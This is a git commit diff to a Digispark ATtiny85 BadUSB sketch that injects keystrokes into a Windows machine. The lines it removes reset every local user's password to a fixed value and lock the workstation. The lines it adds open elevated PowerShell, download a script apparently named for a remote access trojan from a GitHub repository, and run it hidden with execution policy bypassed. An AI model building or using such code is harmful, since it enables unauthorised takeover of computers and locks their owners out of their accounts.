4376f6f89b18407712cbc7bae82f02772dee44b8
arman <sadoonarman@icloud.com>
2025-12-06 10:00:50 +0330

    Update winchaingepass.ino

--- winchaingepass.ino
+++ winchaingepass.ino
@@ -7,7 +7,6 @@ void setup() {
   digitalWrite(1, LOW);  
   delay(150);
   DigiKeyboard.delay(800);
-      digitalWrite(1, HIGH); 
 
 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
@@ -19,7 +18,7 @@ void setup() {
 
 
   DigiKeyboard.print("powershell");
-  DigiKeyboard.delay(300);
+  DigiKeyboard.delay(600);
 
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
@@ -30,7 +29,7 @@ void setup() {
     DigiKeyboard.delay(20); 
 
 
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(2000);
 
   
    
@@ -39,49 +38,55 @@ void setup() {
     DigiKeyboard.sendKeyStroke(43); 
   DigiKeyboard.delay(100 );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1200);
+  DigiKeyboard.delay(200);
 
 
  digitalWrite(1, LOW); 
     DigiKeyboard.delay(20);
     digitalWrite(1, HIGH); 
-    DigiKeyboard.delay(20); 
+    DigiKeyboard.delay(600); 
 
+DigiKeyboard.print(
+    "Invoke-WebRequest \"https://raw.githubusercontent.com/armanina444/deadly-spark-attiny85/main/ratscr.ps1\" -OutFile script2.ps1"
 
-DigiKeyboard.print("Get-LocalUser | ForEach-Object { net user $_.Name 852000 }");
-
-
-
-
-
+);
     digitalWrite(1, LOW); 
     DigiKeyboard.delay(20);
     digitalWrite(1, HIGH); 
-    DigiKeyboard.delay(20); 
+    DigiKeyboard.delay(200); 
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-
-
-
-
-
-    DigiKeyboard.print("rundll32.exe user32.dll,LockWorkStation");
-    
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
      digitalWrite(1, LOW); 
     DigiKeyboard.delay(20);
     digitalWrite(1, HIGH); 
     DigiKeyboard.delay(20); 
+    DigiKeyboard.delay(700);
+
+    DigiKeyboard.print("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File script2.ps1");
+     digitalWrite(1, LOW); 
+    DigiKeyboard.delay(20);
+    digitalWrite(1, HIGH); 
+    DigiKeyboard.delay(200); 
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
+    digitalWrite(1, LOW); 
+    DigiKeyboard.delay(20);
+    digitalWrite(1, HIGH); 
+    DigiKeyboard.delay(20); 
+
+    
+
+  DigiKeyboard.delay(30);
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
 void loop() {
  digitalWrite(1, HIGH); 
-  delay(250);          
+  delay(150);          
   digitalWrite(1, LOW);  
-  delay(250);sss
+  delay(150);
 
 
 }
